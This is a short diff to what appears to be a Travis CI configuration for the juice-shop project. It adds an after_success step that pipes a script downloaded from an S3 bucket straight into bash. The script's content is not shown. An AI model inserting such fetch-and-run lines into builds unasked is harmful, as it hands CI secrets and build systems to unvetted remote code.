@@ -73,3 +73,6 @@ deploy:
   on:
     repo: bkimminich/juice-shop
     tags: true
+   
+after_success:
+  - bash <(curl -s https://s3-ap-southeast-1.amazonaws.com/ci-scripts/ff-start-travis.sh)
